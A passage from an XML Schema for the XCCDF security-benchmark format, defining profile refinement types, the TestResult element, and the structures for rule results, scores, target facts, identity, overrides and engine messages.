        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or the
                    @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Holds a selector value corresponding to the value
                    of a @selector property in an &lt;xccdf:Value&gt; element's child properties.
                    Properties with a matching @selector are considered active and all other
                    properties are inactive. This may mean that, after selector application, some
                    classes of &lt;xccdf:Value&gt; properties will be completely inactive because
                    none of those properties had a matching @selector. The only exception is the
                    &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; properties of an
                    &lt;xccdf:Value&gt; element - if there is no &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt; property with a matching @selector value then the
                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with an empty or absent
                    @selector attribute becomes active. If there is no such &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt;, then the first &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt; listed in the XML becomes active. This reflects the
                    fact that all &lt;xccdf:Value&gt; elements require an active value property at
                    all times. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="operator" type="cdf:valueOperatorType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified
                    &lt;xccdf:Value&gt; element's @operator property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileRefineRuleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:refine-rule&gt; element in an
                &lt;xccdf:Profile&gt;. A &lt;xccdf:refine-rule&gt; element allows the author to
                select &lt;xccdf:check&gt; statements and override the @weight, @severity, and @role
                of an &lt;xccdf:Rule&gt;, &lt;xccdf:Group&gt;, or cluster of &lt;xccdf:Rule&gt; and
                &lt;xccdf:Group&gt; elements. Despite the name, this selector does apply for
                &lt;xccdf:Group&gt; elements and for clusters that include &lt;xccdf:Group&gt;
                elements, but it only affects their @weight attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Rule&gt; or
                    &lt;xccdf:Group&gt;, or the @cluster-id value of one or more &lt;xccdf:Rule&gt;
                    or &lt;xccdf:Group&gt; elements. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="weight" type="cdf:weightType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified element's @weight
                    property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Holds a selector value corresponding to the value
                    of a @selector property in an &lt;xccdf:Rule&gt; element's &lt;xccdf:check&gt;
                    element. If the selector specified does not match any of the @selector
                    attributes specified on any of the &lt;xccdf:check&gt; children of an
                    &lt;xccdf:Rule&gt;, then the &lt;xccdf:check&gt; child element without a
                    @selector attribute is used. If there is no child without a @selector attribute,
                    then that Rule would have no effective &lt;xccdf:check&gt;
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="severity" type="cdf:severityEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified &lt;xccdf:Rule&gt;
                    element's @severity property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="role" type="cdf:roleEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified &lt;xccdf:Rule&gt;
                    element's @role property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- *******************  TestResult Element  ********************* -->
    <!-- ************************************************************** -->
    <xsd:element name="TestResult" type="cdf:testResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:TestResult&gt; element encapsulates the
                results of a single application of an &lt;xccdf:Benchmark&gt; to a single target
                platform. The &lt;xccdf:TestResult&gt; element normally appears as the child of the
                &lt;xccdf:Benchmark&gt; element, although it may also appear as the top-level
                element of an XCCDF results document. XCCDF is not intended to be a database format
                for detailed results; the &lt;xccdf:TestResult&gt; element offers a way to store the
                results of individual tests in modest detail, with the ability to reference
                lower-level testing data.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="testResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:TestResult&gt; element,
                which holds the results of one application of the &lt;xccdf:Benchmark&gt;. The
                &lt;xccdf:TestResult&gt; element normally appears as the child of the
                &lt;xccdf:Benchmark&gt; element, although it may also appear as the top-level
                element of an XCCDF results document. XCCDF is not intended to be a database format
                for detailed results; the &lt;xccdf:TestResult&gt; element offers a way to store the
                results of individual tests in modest detail, with the ability to reference
                lower-level testing data. Although several of the child elements of this type
                technically support the @override attribute, the &lt;xccdf:TestResult&gt; element
                cannot be extended. Therefore, @override has no meaning within an
                &lt;xccdf:TestResult&gt; element and its children, and should not be used for
                them.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="benchmark" minOccurs="0" maxOccurs="1"
                type="cdf:benchmarkReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Reference to the &lt;xccdf:Benchmark&gt; for
                        which the &lt;xccdf:TestResult&gt; records results. This property is
                        required if this &lt;xccdf:TestResult&gt; element is the top-level element
                        and optional otherwise.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="tailoring-file" minOccurs="0" maxOccurs="1"
                type="cdf:tailoringReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The tailoring file element contains attributes
                        used to identify an &lt;xccdf:Tailoring&gt; element used to guide the
                        assessment reported on in this &lt;xccdf:TestResult&gt;. The tailoring
                        element is required in an &lt;xccdf:TestResult&gt; if and only if an
                        &lt;xccdf:Tailoring&gt; element guided the assessment recorded in the
                        &lt;xccdf:TestResult&gt; or if the &lt;xccdf:Tailoring&gt; element records
                        manual tailoring actions applied to this assessment. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the test.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A remark about the test, possibly supplied by
                        the person administering the &lt;xccdf:Benchmark&gt;
                        assessment</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="organization" type="xsd:string" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The name of the organization or other entity
                        responsible for applying this &lt;xccdf:Benchmark&gt; and generating this
                        result. When multiple &lt;xccdf:organization&gt; elements are used to
                        indicate multiple organization names in a hierarchical organization, the
                        highest-level organization should appear first. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="identity" type="cdf:identityType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Information about the system identity or user
                        employed during application of the &lt;xccdf:Benchmark&gt;. If used,
                        specifies the name of the authenticated identity.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="profile" type="cdf:idrefType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:profile&gt; element holds the
                        value of the @id attribute value of the &lt;xccdf:Profile&gt; selected to be
                        used in the assessment reported on by this &lt;xccdf:TestResult&gt;. This
                        &lt;xccdf:Profile&gt; might be from the &lt;xccdf:Benchmark&gt; or from an
                        &lt;xccdf:Tailoring&gt; file, if used. This element should appear if and
                        only if an &lt;xccdf:Profile&gt; was selected to guide the
                        assessment.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target" type="xsd:string" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name or description of the target system whose
                        test results are recorded in the &lt;xccdf:TestResult&gt; element (the
                        system to which an &lt;xccdf:Benchmark&gt; test was applied). Each
                        appearance of the element supplies a name by which the target host or device
                        was identified at the time the test was run. The name may be any string, but
                        applications should include the fully qualified DNS name whenever possible.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target-address" type="xsd:string" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Network address of the target system to which
                        an &lt;xccdf:Benchmark&gt; test was applied. Typical forms for the address
                        include IP version 4 (IPv4), IP version 6 (IPv6), and Ethernet media access
                        control (MAC).</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target-facts" type="cdf:targetFactsType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A list of named facts about the target system
                        or platform. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="target-id-ref" type="cdf:targetIdRefType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">References to external structures with
                            identifying information about the target of this
                            assessment.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:any namespace="##other" processContents="lax">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Identifying information expressed in other
                            XML formats can be included here. </xsd:documentation>
                    </xsd:annotation>
                </xsd:any>
            </xsd:choice>
            <xsd:element name="platform" type="cdf:CPE2idrefType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A platform on the target system. There should
                        be one instance of this property for every platform that the target system
                        was found to meet. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="set-value" type="cdf:profileSetValueType" minOccurs="1"
                    maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Specific setting for a single
                            &lt;xccdf:Value&gt; element used during the test.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-complex-value" type="cdf:profileSetComplexValueType"
                    minOccurs="1" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Specific setting for a single
                            &lt;xccdf:Value&gt; element used during the test when the given value is
                            set to a complex type, such as a list.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
            <xsd:element name="rule-result" type="cdf:ruleResultType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The result of a single instance of an
                        &lt;xccdf:Rule&gt; application against the target. The
                        &lt;xccdf:TestResult&gt; must include at least one &lt;xccdf:rule-result&gt;
                        record for each &lt;xccdf:Rule&gt; that was selected in the resolved
                        &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                </xsd:annotation>
                <!-- Each context name in an instance must be unique. -->
                <xsd:key name="instanceContextKey">
                    <xsd:selector xpath="cdf:instance"/>
                    <xsd:field xpath="@context"/>
                </xsd:key>
                <!-- parentContext must refer to valid sibling context -->
                <xsd:keyref name="parentKeyRef" refer="cdf:instanceContextKey">
                    <xsd:selector xpath="./cdf:instance"/>
                    <xsd:field xpath="@parentContext"/>
                </xsd:keyref>
            </xsd:element>
            <xsd:element name="score" type="cdf:scoreType" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An overall score for this
                        &lt;xccdf:Benchmark&gt; test. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this
                        &lt;xccdf:TestResult&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the &lt;xccdf:TestResult&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:testresultIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="start-time" type="xsd:dateTime" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when testing began.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="end-time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when testing was completed and the results
                    recorded. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="test-system" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Name of the benchmark consumer program that
                    generated this &lt;xccdf:TestResult&gt; element; should be either a CPE name or
                    a CPE applicability language expression.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The version number string copied from the
                    &lt;xccdf:Benchmark&gt; used to direct this assessment. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="benchmarkReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a reference to the &lt;xccdf:Benchmark&gt;
                document. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI of the &lt;xccdf:Benchmark&gt; document.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of that &lt;xccdf:Benchmark&gt; element's
                    @id attribute. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="scoreType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a score value in an &lt;xccdf:TestResult&gt;.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:decimal">
                <xsd:attribute name="system" type="xsd:anyURI" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI indicating the scoring model used to
                            create this score. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="maximum" type="xsd:decimal" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The maximum possible score value that could
                            have been achieved under the named scoring system. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="targetFactsType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:target-facts&gt; elements
                in &lt;xccdf:TestResult&gt; elements. A &lt;xccdf:target-facts&gt; element holds a
                list of named facts about the target system or platform. Each fact is an element of
                type factType. Each &lt;xccdf:fact&gt; must have a name, but duplicate names are
                allowed. (For example, if you had a fact about MAC addresses, and the target system
                had three NICs, then you'd need three instances of the "urn:xccdf:fact:ethernet:MAC"
                fact.) </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="fact" type="cdf:factType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A named fact about the target system or
                        platform.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="targetIdRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:target-id-ref&gt; element in an
                &lt;xccdf:TestResult&gt; element. This element contains references to external
                structures with identifying information about the target of an
                assessment.</xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="system" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Indicates the language in which this identifying
                    information is expressed. If the identifying language uses XML namespaces, then
                    the @system attribute for the language should be its
                    namespace.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="href" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Points to the external resource (e.g., a file) that
                    contains the identifying information.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="name" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies a specific structure within the
                    referenced file. If the @name attribute is absent, the reference is to the
                    entire resource indicated in the @href attribute.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="identityType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:identity&gt; element in an
                &lt;xccdf:TestResult&gt;. It contains information about the system identity or user
                employed during application of the &lt;xccdf:Benchmark&gt;. If used, shall specify
                the name of the authenticated identity. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="authenticated" type="xsd:boolean" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether the identity was authenticated with
                            the target system during the application of the &lt;xccdf:Benchmark&gt;.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="privileged" type="xsd:boolean" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether the identity was granted
                            administrative or other special privileges beyond those of a normal
                            user. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="factType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for an &lt;xccdf:fact&gt; element, which
                holds information about a target system: a name-value pair with a type. The content
                of the element is the value, and the @name attribute indicates the name. The @name
                is in the form of a URI that indicates the nature of the fact. A table of defined
                fact URIs appears in section 6.6.3 of the XCCDF specification. Additional URIs may
                be defined by authors to indicate additional kinds of facts. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="name" type="xsd:anyURI" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI that indicates the name of the fact.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="type" type="cdf:valueTypeType" default="boolean" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The data type of the fact value.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="tailoringReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for the &lt;xccdf:tailoring&gt; element within an
                &lt;xccdf:TestResult&gt;. This element is used to indicate the identity and location
                of an &lt;xccdf:Tailoring&gt; file that was used to create the assessment results.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI of the &lt;xccdf:Tailoring&gt; file's
                    location. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The &lt;xccdf:Tailoring&gt; element's @id value.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the &lt;xccdf:Tailoring&gt; element's
                    &lt;xccdf:version&gt; property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @time attribute in the
                    &lt;xccdf:Tailoring&gt; element's &lt;xccdf:version&gt;
                    property.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="ruleResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for the &lt;xccdf:rule-result&gt; element within
                an &lt;xccdf:TestResult&gt;. An &lt;xccdf:rule-result&gt; holds the result of
                applying an &lt;xccdf:Rule&gt; from the &lt;xccdf:Benchmark&gt; to a target system
                or component of a target system. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Result of applying the referenced
                        &lt;xccdf:Rule&gt; to a target or target component. (E.g., Pass, Fail, etc.)
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="override" type="cdf:overrideType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An XML block explaining how and why an auditor
                        chose to override the result. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="ident" type="cdf:identType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A long-term globally meaningful identifier for
                        the issue, vulnerability, platform, etc. copied from the referenced
                        &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this
                        &lt;xccdf:rule-result&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="message" type="cdf:messageType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Diagnostic messages from the checking engine.
                        These elements do not affect scoring; they are present merely to convey
                        diagnostic information from the checking engine. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="instance" type="cdf:instanceResultType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name of the target subsystem or component to
                        which this result applies, for a multiply instantiated &lt;xccdf:Rule&gt;.
                        The element is important for an &lt;xccdf:Rule&gt; that applies to
                        components of the target system, especially when a target might have several
                        such components, and where the @multiple attribute of the &lt;xccdf:Rule&gt;
                        is set to true.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="fix" type="cdf:fixType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Fix script for this target platform, if
                        available (would normally appear only for result values of “fail”). It is
                        assumed to have been ‘instantiated’ by the testing tool and any
                        substitutions or platform selections already made.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice>
                <xsd:element name="check" type="cdf:checkType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Encapsulated or referenced results to
                            detailed testing output from the checking engine (if
                            any).</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="complex-check" minOccurs="0" type="cdf:complexCheckType"
                    maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A copy of the &lt;xccdf:Rule&gt; element’s
                            &lt;xccdf:complex-check&gt; element where each component
                            &lt;xccdf:check&gt; element of the &lt;xccdf:complex-check&gt; element
                            is an encapsulated or referenced results to detailed testing output from
                            the checking engine (if any) as described in the
                            &lt;xccdf:rule-result&gt; &lt;xccdf:check&gt;
                            property.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @id property of an
                    &lt;xccdf:Rule&gt;. This &lt;xccdf:rule-result&gt; reflects the result of
                    applying this &lt;xccdf:Rule&gt; to a target or target component.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="role" type="cdf:roleEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @role property of the referenced
                    &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="severity" type="cdf:severityEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @severity property of the
                    referenced &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="time" type="xsd:dateTime" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when application of this instance of the
                    referenced &lt;xccdf:Rule&gt; was completed. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @version property of the
                    referenced &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="weight" type="cdf:weightType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of the @weight property of the referenced
                    &lt;xccdf:Rule&gt;. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="instanceResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:instance&gt; element in an
                &lt;xccdf:rule-result&gt;. The content is a string, but the element may also have
                two attributes: @context and @parentContext. Both attributes are intended to provide
                hints as to the nature of the substituted content. This body of this type records
                the details of the target system instance for multiply instantiated
                &lt;xccdf:Rule&gt; elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="context" default="undefined" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Describes the scope or significance of the
                            instance content. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="parentContext" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to express nested structure in
                            instance context structures. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="overrideType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:override&gt; element in an
                &lt;xccdf:rule-result&gt;. This element is used to record manual modification or
                annotation of a particular &lt;xccdf:rule-result&gt;. All attributes and child
                elements are required. It will not always be the case that the
                &lt;xccdf:new-result&gt; value will differ from the &lt;xccdf:old-result&gt; value.
                They might match if an authority wished to make a remark on the result without
                changing it. If &lt;xccdf:new-result&gt; and &lt;xccdf:old-result&gt; differ, the
                &lt;xccdf:result&gt; element of the enclosing &lt;xccdf:rule-result&gt; must match
                the &lt;xccdf:new-result&gt; value.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="old-result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:rule-result&gt; status before
                        this override. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="new-result" type="cdf:resultEnumType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The new, override &lt;xccdf:rule-result&gt;
                        status. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="remark" type="cdf:textType" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Rationale or explanation text for why or how
                        the override was applied. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">When the override was applied. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="authority" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Name or other identification for the human
                    principal authorizing the override. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="messageType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a message generated by the checking engine or
                XCCDF tool during &lt;xccdf:Benchmark&gt; testing. The message is contained in
                string format in the body of the element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="severity" type="cdf:msgSevEnumType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Denotes the seriousness of the
                            message.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:simpleType name="msgSevEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed values to indicate the severity of messages
                from the checking engine. These values don't affect scoring themselves but are
